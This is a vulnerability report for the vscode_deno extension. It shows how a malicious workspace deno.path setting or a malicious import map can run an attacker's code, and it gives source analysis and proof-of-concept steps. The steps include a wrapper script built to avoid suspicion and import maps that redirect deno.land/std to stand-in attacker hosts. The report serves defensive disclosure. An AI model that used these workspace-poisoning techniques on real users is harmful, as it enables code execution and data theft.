# Security Vulnerabilities in vscode_deno

## 1. Arbitrary Command Execution via deno.path

**Description:**
The vscode_deno extension allows users to specify a custom Deno executable path via the `deno.path` setting. When the extension starts the Deno language server, it executes this command without validating that it's actually the Deno CLI.

Step by step trigger process:
1. An attacker creates a malicious executable that performs harmful operations (data exfiltration, establishing a reverse shell, etc.)
2. The attacker creates or modifies a VS Code workspace with a malicious `.vscode/settings.json` file that points `deno.path` to the malicious executable
3. The workspace is shared with a victim (via repository, shared folder, etc.)
4. When the victim opens the workspace with the vscode_deno extension enabled, the extension will execute the malicious executable when it starts the Deno language server

**Impact:**
This vulnerability allows remote code execution with the privileges of the VS Code process. An attacker can execute arbitrary code on the victim's machine, which could lead to data theft, credential stealing, further system compromise, or be used as an entry point for more sophisticated attacks.

**Vulnerability Rank:** High

**Currently Implemented Mitigations:**
The extension checks if the file exists before executing it (via the `fileExists` function), but it doesn't validate that the file is actually the Deno CLI executable.

**Missing Mitigations:**
The extension should validate that the command specified by `deno.path` is actually the Deno CLI before executing it, for example by checking the output of `deno --version` or by verifying the file signature/hash. The extension should also display a prominent warning when a custom Deno path is configured and require explicit user confirmation before using a non-standard Deno path.

**Preconditions:**
- The attacker must have control over the VS Code settings for the victim's workspace (by creating a malicious workspace or modifying an existing one)
- The victim must have the vscode_deno extension installed
- The victim must open the compromised workspace

**Source Code Analysis:**
In `client/src/commands.ts`, the extension starts the Deno language server by executing the command specified by `deno.path`:

```typescript
export function startLanguageServer(
  context: vscode.ExtensionContext,
  extensionContext: DenoExtensionContext,
): Callback {
  return async () => {
    // ...
    const command = await getDenoCommandPath();
    // ...
    const serverOptions: ServerOptions = {
      run: {
        command,
        args: ["lsp"],
        options: { env },
      },
      debug: {
        command,
        args: ["lsp"],
        options: { env },
      },
    };
    const client = new LanguageClient(
      LANGUAGE_CLIENT_ID,
      LANGUAGE_CLIENT_NAME,
      serverOptions,
      // ...
    );
    await client.start();
    // ...
  };
}
```

In `client/src/util.ts`, the `getDenoCommandPath()` function retrieves the command from the `deno.path` setting without validation:

```typescript
export async function getDenoCommandPath() {
  const command = getWorkspaceConfigDenoExePath();
  const workspaceFolders = workspace.workspaceFolders;
  if (!command || !workspaceFolders) {
    return command ?? await getDefaultDenoCommand();
  } else if (!path.isAbsolute(command)) {
    // if sent a relative path, iterate over workspace folders to try and resolve.
    for (const workspace of workspaceFolders) {
      const commandPath = path.resolve(workspace.uri.fsPath, command);
      if (await fileExists(commandPath)) {
        return commandPath;
      }
    }
    return undefined;
  } else {
    return command;
  }
}

function getWorkspaceConfigDenoExePath() {
  const exePath = workspace.getConfiguration(EXTENSION_NS)
    .get<string>("path");
  // it is possible for the path to be blank. In that case, return undefined
  if (typeof exePath === "string" && exePath.trim().length === 0) {
    return undefined;
  } else {
    return exePath;
  }
}
```

The vulnerability occurs because the extension executes whatever command is specified by `deno.path` without validating that it's actually the Deno CLI.

**Security Test Case:**
1. Create a malicious executable called `malicious.sh` with the following content:
   ```bash
   #!/bin/bash
   # This would be a malicious payload, simplified for testing
   touch /tmp/pwned
   # Continue executing deno to avoid suspicion
   /usr/bin/deno "$@"
   ```

2. Make it executable:
   ```bash
   chmod +x malicious.sh
   ```

3. Create a workspace with a `.vscode/settings.json` file:
   ```json
   {
     "deno.enable": true,
     "deno.path": "/path/to/malicious.sh"
   }
   ```

4. Open the workspace with VS Code having the Deno extension installed.

5. Verify that `/tmp/pwned` exists, confirming that the malicious executable was executed.

## 2. Remote Code Execution via Import Maps

**Description:**
The VS Code Deno extension allows users to specify a custom import map file through the `deno.importMap` setting. An attacker can create a malicious import map that redirects legitimate module specifiers to attacker-controlled code. When a user imports a module using the expected specifier, the Deno CLI would instead load and execute the attacker's code.

Steps to trigger this vulnerability:
1. Create a malicious import map file that redirects common imports to attacker-controlled code
2. Set the `deno.importMap` configuration to point to this malicious file
3. When the user imports a module that matches a redirected specifier, the malicious code would be executed instead of the legitimate module

**Impact:**
This vulnerability allows for remote code execution in the context of the user's Deno process. This could lead to:
- Exfiltration of sensitive data from the user's system
- Modification or deletion of files accessible by the user
- Further compromise of the user's system through execution of arbitrary code

**Vulnerability Rank:** High

**Currently Implemented Mitigations:**
The extension does not have specific mitigations for this vulnerability. It passes the import map directly to the Deno CLI without validation of its contents. The only check is to ensure the setting is not empty:

```typescript
const importMap: string | undefined | null = config.get("importMap");
if (importMap?.trim()) {
  testArgs.push("--import-map", importMap.trim());
}
```

**Missing Mitigations:**
1. Validate the content of import map files to ensure they only redirect to trusted domains
2. Warn users when they're loading an import map from an untrusted source
3. Provide a mechanism to validate import maps against a whitelist of allowed redirect targets
4. Add a confirmation dialog before using a new or changed import map

**Preconditions:**
1. The attacker must be able to influence the `deno.importMap` setting in the user's VS Code workspace
2. The attacker must be able to host malicious code that will be loaded via the import map redirect
3. The user must import a module that matches a specifier redirected in the malicious import map

**Source Code Analysis:**
The vulnerability exists in how import maps are loaded and used in the extension:

1. In `client/src/commands.ts`, when setting up test execution, the extension reads the import map setting from configuration:
```typescript
if (!testArgs.includes("--import-map")) {
  const importMap: string | undefined | null = config.get("importMap");
  if (importMap?.trim()) {
    testArgs.push("--import-map", importMap.trim());
  }
}
```

2. Similarly, when initializing the Deno Language Server in `client/src/extension.ts`:
```typescript
initializationOptions: () => {
  const denoConfiguration = vscode.workspace.getConfiguration().get(
    EXTENSION_NS,
  ) as Record<string, unknown>;
  // ...
  return {
    ...denoConfiguration, // This passes the importMap setting to the language server
    // ...
  } as object;
}
```

3. The `importMap` setting is passed directly to the Deno CLI without any validation of its contents.

4. When Deno resolves imports, it uses the import map to redirect module specifiers, which could lead to loading and executing attacker-controlled code.

For example, if a malicious import map contains:
```json
{
  "imports": {
    "https://deno.land/std/": "https://evil.com/fake-std/"
  }
}
```

When a user imports `https://deno.land/std/http/server.ts`, Deno would instead load `https://evil.com/fake-std/http/server.ts`, which could contain malicious code.

**Security Test Case:**
To demonstrate this vulnerability:

1. Create a malicious import map file (malicious-map.json):
```json
{
  "imports": {
    "https://deno.land/std/": "https://attacker-controlled-server.com/fake-std/"
  }
}
```

2. Host malicious code at `https://attacker-controlled-server.com/fake-std/http/server.ts` that contains:
```typescript
console.log("Malicious code executed");
// Add malicious payload here
export * from "https://deno.land/std/http/server.ts"; // Re-export the real module to avoid detection
```

3. Create or modify a VS Code workspace configuration to use this import map:
```json
{
  "deno.enable": true,
  "deno.importMap": "./malicious-map.json"
}
```

4. Share this workspace with a victim (e.g., through a GitHub repository)

5. When the victim opens the workspace and writes code that imports from `https://deno.land/std/`, the malicious code from the attacker's server will be executed instead of the legitimate module.
